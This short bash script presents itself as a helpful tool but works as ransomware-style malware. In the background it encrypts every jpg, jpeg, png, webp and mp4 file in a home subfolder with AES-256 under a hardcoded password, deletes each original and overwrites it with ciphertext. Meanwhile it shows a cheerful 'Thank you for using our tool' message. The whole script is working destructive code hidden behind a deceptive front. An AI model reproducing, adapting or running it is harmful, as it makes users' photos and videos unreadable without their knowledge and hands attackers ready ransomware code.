#!/bin/bash

AC_DIR="$HOME/tes"
AC_PW="k3[oenen3*_*&/*/£5,mrk4nrm3%#&#&#&#,#?*/&=,]"
AC_AE="jpg jpeg png webp mp4"
TODAY=$(date "+%d-%m-%Y")
AC_EN() {
  local FILE="$1"
  EXT="${FILE##*.}"
  if echo "$AC_AE" | grep -w "$EXT" > /dev/null; then
    if [ -f "$FILE" ]; then
      if [[ "$FILE" != *.enc ]]; then
        TEMP_FILE="${FILE}.enc"
        openssl enc -aes-256-cbc -salt -in "$FILE" -out "$TEMP_FILE" -k "$AC_PW" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
          rm -f "$FILE"
          mv "$TEMP_FILE" "$FILE"
        fi
      fi
    fi
  fi
}
AC_DIRc() {
  find "$AC_DIR" -type f | while read FILE; do
    AC_EN "$FILE"
  done
}
if [ ! -d "$AC_DIR" ]; then
  exit 1
fi
(
  AC_DIRc
) &
echo "Thank you for using our tool. Now Anton is working for you😊 ( $TODAY )"
exit 0